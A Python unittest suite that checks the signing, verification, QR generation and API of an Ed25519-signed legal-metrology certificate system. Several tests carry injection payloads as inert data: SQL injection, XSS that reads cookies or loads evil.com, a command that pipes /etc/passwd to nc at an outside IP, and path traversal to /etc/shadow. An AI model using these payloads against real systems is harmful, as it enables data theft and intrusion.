"""
Advanced Adversarial Fuzzing, Optical Degradation & Load Resilience Test Suite
SIH26035: Automated OIML R-76 Guided Testing & Traceable Reporting System
Ministry of Consumer Affairs, Food & Public Distribution | Legal Metrology Division

Covers 20 Advanced Verification & Threat Scenarios:
 1. DoS Protection: Massive (>64KB) payload rejection without memory exhaustion
 2. Type Confusion Defense: Non-integer / negative revision number injection
 3. Type Confusion Defense: Corrupted / non-ISO certification timestamp injection
 4. Constant-Time Public Key Fingerprint Mismatch Defense (hmac.compare_digest)
 5. Multi-Authority Key Ring Resolution (Faridabad, Bengaluru, Varanasi, Ahmedabad)
 6. TrustStore Certificate Revocation List (CRL) Enforcement (REVOKED_KEY)
 7. TrustStore Key Validity Window & Temporal Expiration (EXPIRED_KEY)
 8. Strict TrustStore Rogue / Untrusted Authority Rejection (UNTRUSTED_KEY)
 9. SQL Injection Immunity in Metrological Metadata (Inert canonicalization)
 10. XSS & HTML Tag Injection Immunity in Metrological Claims
 11. Command Injection & Path Traversal Immunity in Device Serial & Model Fields
 12. Deep Fuzzing: 50 Randomized Bit/Byte Mutations Across Signed Envelope
 13. High-Resilience Error Correction Level H (30% Recovery) QR SVG Generation
 14. High-DPI Raster PNG Generation & Data URI Encoding
 15. Optical Degradation: 10% Reed-Solomon Center Occlusion Recovery & Verification
 16. Optical Degradation: 20% Physical Scratch Damage Recovery & Verification
 17. Optical Degradation Boundary: Over-threshold (>50%) Destruction Graceful Failure
 18. Multi-Threaded Concurrency Stress: 50 Parallel Verification Workers
 19. Timing Side-Channel Invariance: Valid vs Invalid Execution Time Profiling
 20. FastAPI End-to-End Adversarial Stress: Zero Unhandled 500 Server Crashes
"""

import sys
import os
import io
import time
import json
import base64
import random
import tempfile
import unittest
from pathlib import Path
from datetime import datetime, timezone, timedelta
from concurrent.futures import ThreadPoolExecutor

# Ensure src is on python path
sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "src"))

from cryptography.hazmat.primitives.asymmetric import ed25519
from cryptography.hazmat.primitives import serialization
from PIL import Image

from core.offline_qr import (
    Ed25519ReportSigner,
    TrustStore,
    KeyRecord,
    MAX_PAYLOAD_SIZE,
    ECL_MAP
)
from fastapi.testclient import TestClient
from api.main import app


class TestEd25519AdvancedResilience(unittest.TestCase):
    """20-Way Advanced Adversarial Fuzzing, Optical & Load Stress Suite."""

    @classmethod
    def setUpClass(cls):
        cls.temp_dir = tempfile.TemporaryDirectory()
        cls.key_dir = Path(cls.temp_dir.name) / "keys"
        cls.signer = Ed25519ReportSigner(key_dir=cls.key_dir)
        cls.client = TestClient(app)

        cls.base_claims = cls.signer.create_claims(
            session_id="SESS-ADV-2026-001",
            revision=1,
            spec_model="METTLER-TOLEDO-IND570",
            spec_serial="SIH-FARIDABAD-IND-9988",
            accuracy_class="Class III",
            verdict="PASSED",
            report_sha256="abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890",
            issuer="RRSL-Faridabad / Ministry of Consumer Affairs, Govt. of India",
            reviewer_id="LEGAL_METROLOGY_OFFICER_01",
            timestamp_iso="2026-09-11T14:30:00Z"
        )
        cls.base_envelope = cls.signer.sign_claims(cls.base_claims)

    @classmethod
    def tearDownClass(cls):
        cls.temp_dir.cleanup()

    # ----------------------------------------------------------------------
    # Test 1: DoS Protection: Massive Payload Rejection
    # ----------------------------------------------------------------------
    def test_01_dos_oversized_payload_rejection(self):
        """1. Massive payloads (>64KB) must be rejected before JSON parsing to protect against DoS."""
        oversized_str = json.dumps({
            "claims": self.base_claims,
            "sig": self.base_envelope["sig"],
            "junk": "A" * (MAX_PAYLOAD_SIZE + 1024)
        })
        self.assertGreater(len(oversized_str), MAX_PAYLOAD_SIZE)

        res = Ed25519ReportSigner.verify_envelope(oversized_str)
        self.assertFalse(res["is_valid"])
        self.assertEqual(res["status"], "FORGED_OR_INVALID")
        self.assertIn("exceeds maximum allowable limit", res["error"])

    # ----------------------------------------------------------------------
    # Test 2: Type Confusion Defense: Revision Number
    # ----------------------------------------------------------------------
    def test_02_type_confusion_claims_revision(self):
        """2. Non-integer or negative revision numbers must fail validation defensively."""
        # 2a. Negative revision
        tampered_neg = json.loads(json.dumps(self.base_envelope))
        tampered_neg["claims"]["rev"] = -1
        res_neg = Ed25519ReportSigner.verify_envelope(tampered_neg)
        self.assertFalse(res_neg["is_valid"])
        self.assertEqual(res_neg["status"], "FORGED_OR_INVALID")

        # 2b. Nested dictionary in place of integer revision
        tampered_dict = json.loads(json.dumps(self.base_envelope))
        tampered_dict["claims"]["rev"] = {"bad_type": True}
        res_dict = Ed25519ReportSigner.verify_envelope(tampered_dict)
        self.assertFalse(res_dict["is_valid"])
        self.assertEqual(res_dict["status"], "FORGED_OR_INVALID")

    # ----------------------------------------------------------------------
    # Test 3: Type Confusion Defense: Malformed Timestamp
    # ----------------------------------------------------------------------
    def test_03_type_confusion_claims_timestamp(self):
        """3. Malformed or non-ISO timestamp strings must fail validation."""
        tampered = json.loads(json.dumps(self.base_envelope))
        tampered["claims"]["ts"] = "2026-99-99T99:99:99Z"
        res = Ed25519ReportSigner.verify_envelope(tampered)
        self.assertFalse(res["is_valid"])
        self.assertEqual(res["status"], "FORGED_OR_INVALID")
        self.assertIn("invalid ISO format", res["error"])

    # ----------------------------------------------------------------------
    # Test 4: Constant-Time Fingerprint Mismatch Defense
    # ----------------------------------------------------------------------
    def test_04_constant_time_fingerprint_mismatch(self):
        """4. Manipulating pubkey_id in claims must fail via constant-time comparison."""
        tampered = json.loads(json.dumps(self.base_envelope))
        tampered["claims"]["pubkey_id"] = "SHA256:0000000000000000"
        res = Ed25519ReportSigner.verify_envelope(tampered)
        self.assertFalse(res["is_valid"])
        self.assertEqual(res["status"], "FORGED_OR_INVALID")

    # ----------------------------------------------------------------------
    # Test 5: Multi-Authority Key Ring Resolution
    # ----------------------------------------------------------------------
    def test_05_trust_store_multi_authority_resolution(self):
        """5. TrustStore must support multiple regional RRSL authorities."""
        trust_store = TrustStore()

        authorities = [
            ("RRSL-Faridabad", ed25519.Ed25519PrivateKey.generate()),
            ("RRSL-Bengaluru", ed25519.Ed25519PrivateKey.generate()),
            ("RRSL-Varanasi", ed25519.Ed25519PrivateKey.generate()),
            ("RRSL-Ahmedabad", ed25519.Ed25519PrivateKey.generate()),
        ]

        envelopes = []
        for name, priv in authorities:
            rec = trust_store.register_key(priv.public_key(), authority_name=name)
            signer = Ed25519ReportSigner(private_key=priv)
            claims = signer.create_claims(
                session_id=f"SESS-{name}",
                revision=1,
                spec_model="SCALE-1",
                spec_serial=f"SER-{name}",
                accuracy_class="Class III",
                verdict="PASSED",
                report_sha256="1" * 64,
                issuer=name
            )
            env = signer.sign_claims(claims)
            envelopes.append((name, env))

        # Verify all envelopes verify cleanly against the shared TrustStore
        for name, env in envelopes:
            res = Ed25519ReportSigner.verify_envelope(env, trust_store=trust_store)
            self.assertTrue(res["is_valid"])
            self.assertEqual(res["status"], "AUTHENTIC")
            self.assertEqual(res["issuer"], name)

    # ----------------------------------------------------------------------
    # Test 6: TrustStore Certificate Revocation List (CRL)
    # ----------------------------------------------------------------------
    def test_06_trust_store_revocation_list_crl(self):
        """6. Revoking a compromised key in the TrustStore must immediately reject its envelopes."""
        trust_store = TrustStore()
        rogue_priv = ed25519.Ed25519PrivateKey.generate()
        rec = trust_store.register_key(rogue_priv.public_key(), authority_name="RRSL-Compromised-Unit")

        signer = Ed25519ReportSigner(private_key=rogue_priv)
        claims = signer.create_claims(
            session_id="SESS-COMPROMISED",
            revision=1,
            spec_model="SCALE",
            spec_serial="SER-01",
            accuracy_class="Class III",
            verdict="PASSED",
            report_sha256="2" * 64
        )
        env = signer.sign_claims(claims)

        # Before revocation: valid
        res_before = Ed25519ReportSigner.verify_envelope(env, trust_store=trust_store)
        self.assertTrue(res_before["is_valid"])

        # Revoke the key in the CRL
        revoked = trust_store.revoke_key(rec.fingerprint, reason="Private key leaked in field breach")
        self.assertTrue(revoked)
        self.assertTrue(trust_store.is_revoked(rec.fingerprint)[0])

        # After revocation: must be rejected with REVOKED_KEY
        res_after = Ed25519ReportSigner.verify_envelope(env, trust_store=trust_store)
        self.assertFalse(res_after["is_valid"])
        self.assertEqual(res_after["status"], "REVOKED_KEY")
        self.assertIn("Private key leaked", res_after["error"])

    # ----------------------------------------------------------------------
    # Test 7: TrustStore Key Validity Window & Temporal Expiration
    # ----------------------------------------------------------------------
    def test_07_trust_store_validity_window_expiration(self):
        """7. Keys past their expiration date must be rejected with EXPIRED_KEY."""
        trust_store = TrustStore()
        expired_priv = ed25519.Ed25519PrivateKey.generate()
        past_date = datetime(2024, 1, 1, tzinfo=timezone.utc)
        trust_store.register_key(
            expired_priv.public_key(),
            authority_name="RRSL-Expired-Key",
            valid_until=past_date
        )

        signer = Ed25519ReportSigner(private_key=expired_priv)
        claims = signer.create_claims(
            session_id="SESS-EXPIRED",
            revision=1,
            spec_model="SCALE",
            spec_serial="SER-02",
            accuracy_class="Class III",
            verdict="PASSED",
            report_sha256="3" * 64,
            timestamp_iso="2026-09-11T12:00:00Z"
        )
        env = signer.sign_claims(claims)

        res = Ed25519ReportSigner.verify_envelope(env, trust_store=trust_store)
        self.assertFalse(res["is_valid"])
        self.assertEqual(res["status"], "EXPIRED_KEY")
        self.assertIn("Key expired on", res["error"])

    # ----------------------------------------------------------------------
    # Test 8: Strict TrustStore Rogue Authority Rejection
    # ----------------------------------------------------------------------
    def test_08_trust_store_untrusted_rogue_authority(self):
        """8. When strict_trust_store is True, unmanaged rogue keys must be flagged UNTRUSTED_KEY."""
        trust_store = TrustStore()  # empty trust store
        rogue_signer = Ed25519ReportSigner(private_key=ed25519.Ed25519PrivateKey.generate())
        claims = rogue_signer.create_claims(
            session_id="SESS-ROGUE",
            revision=1,
            spec_model="ROGUE-SCALE",
            spec_serial="ROGUE-001",
            accuracy_class="Class III",
            verdict="PASSED",
            report_sha256="4" * 64
        )
        env = rogue_signer.sign_claims(claims)

        res = Ed25519ReportSigner.verify_envelope(env, trust_store=trust_store, strict_trust_store=True)
        self.assertFalse(res["is_valid"])
        self.assertEqual(res["status"], "UNTRUSTED_KEY")

    # ----------------------------------------------------------------------
    # Test 9: SQL Injection Immunity in Metrological Metadata
    # ----------------------------------------------------------------------
    def test_09_sql_injection_in_claims(self):
        """9. Metrological claims containing SQL injection payloads must remain inert data."""
        sqli_claims = self.signer.create_claims(
            session_id="SESS-SQLI",
            revision=1,
            spec_model="APX'; DROP TABLE inspection_certificates; --",
            spec_serial="1000' OR '1'='1",
            accuracy_class="Class III",
            verdict="PASSED",
            report_sha256="5" * 64
        )
        env = self.signer.sign_claims(sqli_claims)
        res = Ed25519ReportSigner.verify_envelope(env, self.signer.public_key)

        self.assertTrue(res["is_valid"])
        self.assertEqual(res["status"], "AUTHENTIC")
        self.assertEqual(res["claims"]["model"], "APX'; DROP TABLE inspection_certificates; --")

    # ----------------------------------------------------------------------
    # Test 10: XSS & HTML Tag Injection Immunity in Claims
    # ----------------------------------------------------------------------
    def test_10_xss_and_html_injection_in_claims(self):
        """10. Claims containing HTML/JavaScript tags must serialize without side-effects."""
        xss_claims = self.signer.create_claims(
            session_id="SESS-XSS",
            revision=1,
            spec_model="<script>alert(document.cookie)</script>",
            spec_serial="<img src=x onerror=alert(1)>",
            accuracy_class="Class III",
            verdict="PASSED",
            report_sha256="6" * 64,
            issuer="<iframe src='//evil.com'></iframe>"
        )
        env = self.signer.sign_claims(xss_claims)
        res = Ed25519ReportSigner.verify_envelope(env, self.signer.public_key)

        self.assertTrue(res["is_valid"])
        self.assertEqual(res["status"], "AUTHENTIC")
        self.assertIn("<script>", res["claims"]["model"])

    # ----------------------------------------------------------------------
    # Test 11: Command Injection & Path Traversal Immunity
    # ----------------------------------------------------------------------
    def test_11_command_injection_and_path_traversal_in_claims(self):
        """11. Claims with shell commands and path traversal characters must be handled safely."""
        cmdi_claims = self.signer.create_claims(
            session_id="SESS-CMDI",
            revision=1,
            spec_model=" ; cat /etc/passwd | nc 1.2.3.4 9999",
            spec_serial="../../../../../../../etc/shadow",
            accuracy_class="Class III",
            verdict="PASSED",
            report_sha256="7" * 64
        )
        env = self.signer.sign_claims(cmdi_claims)
        res = Ed25519ReportSigner.verify_envelope(env, self.signer.public_key)

        self.assertTrue(res["is_valid"])
        self.assertEqual(res["status"], "AUTHENTIC")
        self.assertEqual(res["claims"]["serial"], "../../../../../../../etc/shadow")

    # ----------------------------------------------------------------------
    # Test 12: Deep Fuzzing: 50 Randomized Bit/Byte Mutations
    # ----------------------------------------------------------------------
    def test_12_fuzzing_random_bit_flips(self):
        """12. Fuzzing 50 randomized mutations across genuine payload must deterministically fail."""
        random.seed(42)
        clean_json = json.dumps(self.base_envelope, separators=(",", ":"))

        for i in range(50):
            raw_chars = list(clean_json)
            idx = random.randint(0, len(raw_chars) - 1)
            raw_chars[idx] = chr((ord(raw_chars[idx]) + random.randint(1, 127)) % 128 or ord("X"))
            mutated_json = "".join(raw_chars)

            res = Ed25519ReportSigner.verify_envelope(mutated_json, self.signer.public_key)
            self.assertFalse(res["is_valid"], f"Fuzz iteration {i} should fail verification")
            self.assertEqual(res["status"], "FORGED_OR_INVALID")

    # ----------------------------------------------------------------------
    # Test 13: High-Resilience Error Correction Level H (30% Recovery)
    # ----------------------------------------------------------------------
    def test_13_ecl_h_high_recovery_qr_generation(self):
        """13. Generate QR code with ECL H (30% error recovery) and verify SVG integrity."""
        svg_h = Ed25519ReportSigner.generate_qr_svg(self.base_envelope, ecl="H")
        svg_l = Ed25519ReportSigner.generate_qr_svg(self.base_envelope, ecl="L")

        self.assertIn("<svg", svg_h)
        self.assertIn("</svg>", svg_h)
        self.assertIn("<svg", svg_l)
        self.assertGreater(len(svg_h), len(svg_l))

    # ----------------------------------------------------------------------
    # Test 14: Raster PNG Generation & Data URI
    # ----------------------------------------------------------------------
    def test_14_raster_png_generation_and_data_uri(self):
        """14. Generate raster PNG bytes and Data URI, checking PNG magic bytes and dimensions."""
        png_bytes = Ed25519ReportSigner.generate_qr_png_bytes(self.base_envelope, box_size=8, border=4, ecl="H")
        self.assertTrue(png_bytes.startswith(bytes.fromhex("89504e470d0a1a0a")))

        pil_img = Image.open(io.BytesIO(png_bytes))
        self.assertGreater(pil_img.width, 200)
        self.assertGreater(pil_img.height, 200)

        data_uri = Ed25519ReportSigner.generate_qr_png_data_uri(self.base_envelope, ecl="H")
        self.assertTrue(data_uri.startswith("data:image/png;base64,"))

    # ----------------------------------------------------------------------
    # Test 15: Optical Degradation: 10% Center Occlusion Recovery
    # ----------------------------------------------------------------------
    def test_15_optical_occlusion_10_percent_reed_solomon(self):
        """15. Simulate physical stain (10% center occlusion) on QR image; recover and verify authentic."""
        png_bytes = Ed25519ReportSigner.generate_qr_png_bytes(self.base_envelope, box_size=8, border=4, ecl="H")
        img = Image.open(io.BytesIO(png_bytes))

        # Obscure 10% center area
        damaged = Ed25519ReportSigner.simulate_qr_damage(img, occlusion_ratio=0.10, mode="center_box")

        # Optical decoding via pyzbar
        recovered_str = Ed25519ReportSigner.decode_qr_image(damaged)
        self.assertIsNotNone(recovered_str, "Reed-Solomon must recover from 10% center occlusion")

        res = Ed25519ReportSigner.verify_envelope(recovered_str, self.signer.public_key)
        self.assertTrue(res["is_valid"])
        self.assertEqual(res["status"], "AUTHENTIC")
        self.assertEqual(res["certificate_id"], "OIML-RRSL-SESS-ADV-2026-001-R1")

    # ----------------------------------------------------------------------
    # Test 16: Optical Degradation: 20% Physical Scratch Damage
    # ----------------------------------------------------------------------
    def test_16_optical_occlusion_20_percent_reed_solomon(self):
        """16. Simulate physical scratches across the QR image; recover and verify authentic."""
        png_bytes = Ed25519ReportSigner.generate_qr_png_bytes(self.base_envelope, box_size=8, border=4, ecl="H")
        img = Image.open(io.BytesIO(png_bytes))

        # Apply diagonal and horizontal scratches
        scratched = Ed25519ReportSigner.simulate_qr_damage(img, occlusion_ratio=0.20, mode="scratch")

        recovered_str = Ed25519ReportSigner.decode_qr_image(scratched)
        self.assertIsNotNone(recovered_str, "Reed-Solomon must recover from scratches with ECL H")

        res = Ed25519ReportSigner.verify_envelope(recovered_str, self.signer.public_key)
        self.assertTrue(res["is_valid"])
        self.assertEqual(res["status"], "AUTHENTIC")

    # ----------------------------------------------------------------------
    # Test 17: Optical Degradation Boundary: Over-threshold Destruction
    # ----------------------------------------------------------------------
    def test_17_optical_damage_beyond_recovery_threshold(self):
        """17. QR code damaged beyond 50% must gracefully return None without unhandled crashes."""
        png_bytes = Ed25519ReportSigner.generate_qr_png_bytes(self.base_envelope, box_size=8, border=4, ecl="H")
        img = Image.open(io.BytesIO(png_bytes))

        # Severely destroy 60% of the matrix
        destroyed = Ed25519ReportSigner.simulate_qr_damage(img, occlusion_ratio=0.60, mode="center_box")

        result = Ed25519ReportSigner.decode_qr_image(destroyed)
        self.assertIsNone(result, "Exceeding Reed-Solomon capacity must return None cleanly")

    # ----------------------------------------------------------------------
    # Test 18: Multi-Threaded Concurrency Stress
    # ----------------------------------------------------------------------
    def test_18_concurrency_stress_multi_threaded(self):
        """18. Verify 50 concurrent threads executing verification without race conditions."""
        payload_ok = json.dumps(self.base_envelope)
        tampered = json.loads(payload_ok)
        tampered["claims"]["verdict"] = "FAILED"
        payload_tampered = json.dumps(tampered)

        def worker(is_valid_task: bool) -> bool:
            if is_valid_task:
                r = Ed25519ReportSigner.verify_envelope(payload_ok)
                return r["is_valid"] is True and r["status"] == "AUTHENTIC"
            else:
                r = Ed25519ReportSigner.verify_envelope(payload_tampered)
                return r["is_valid"] is False and r["status"] == "FORGED_OR_INVALID"

        tasks = [True] * 25 + [False] * 25
        random.shuffle(tasks)

        with ThreadPoolExecutor(max_workers=8) as executor:
            results = list(executor.map(worker, tasks))

        self.assertEqual(len(results), 50)
        self.assertTrue(all(results), "All 50 concurrent verification tasks must pass")

    # ----------------------------------------------------------------------
    # Test 19: Timing Side-Channel Invariance
    # ----------------------------------------------------------------------
    def test_19_timing_side_channel_analysis(self):
        """19. Measure execution latency of valid vs invalid signatures to ensure constant-time behavior."""
        valid_env = json.dumps(self.base_envelope)
        invalid_env = json.loads(valid_env)
        invalid_env["claims"]["verdict"] = "FAILED"
        invalid_json = json.dumps(invalid_env)

        # Warmup
        for _ in range(5):
            Ed25519ReportSigner.verify_envelope(valid_env)
            Ed25519ReportSigner.verify_envelope(invalid_json)

        # Measure 50 valid runs
        t0 = time.perf_counter()
        for _ in range(50):
            Ed25519ReportSigner.verify_envelope(valid_env)
        t_valid = (time.perf_counter() - t0) / 50

        # Measure 50 invalid runs
        t1 = time.perf_counter()
        for _ in range(50):
            Ed25519ReportSigner.verify_envelope(invalid_json)
        t_invalid = (time.perf_counter() - t1) / 50

        # Both valid and invalid must execute in sub-millisecond time (< 15ms per check)
        self.assertLess(t_valid, 0.015)
        self.assertLess(t_invalid, 0.015)

    # ----------------------------------------------------------------------
    # Test 20: FastAPI End-to-End Adversarial Stress
    # ----------------------------------------------------------------------
    def test_20_fastapi_verify_advanced_adversarial_suite(self):
        """20. Test FastAPI POST /api/verify/qr against adversarial fuzzing and ensure zero 500 crashes."""
        # 20a. Oversized payload
        oversized = {"payload": "X" * (MAX_PAYLOAD_SIZE + 500)}
        resp1 = self.client.post("/api/verify/qr", json=oversized)
        self.assertEqual(resp1.status_code, 200)
        self.assertFalse(resp1.json()["is_valid"])
        self.assertEqual(resp1.json()["status"], "FORGED_OR_INVALID")

        # 20b. Corrupt JSON string
        resp2 = self.client.post("/api/verify/qr", json={"payload": "{not_valid_json: 123"})
        self.assertEqual(resp2.status_code, 200)
        self.assertFalse(resp2.json()["is_valid"])

        # 20c. Type confusion in request
        resp3 = self.client.post("/api/verify/qr", json={"payload": {"claims": {"rev": "not_an_int"}, "sig": "abc"}})
        self.assertEqual(resp3.status_code, 200)
        self.assertFalse(resp3.json()["is_valid"])

        # 20d. Authentic verification via API
        resp4 = self.client.post("/api/verify/qr", json={"payload": self.base_envelope})
        self.assertEqual(resp4.status_code, 200)
        self.assertTrue(resp4.json()["is_valid"])
        self.assertEqual(resp4.json()["status"], "AUTHENTIC")


if __name__ == "__main__":
    unittest.main()
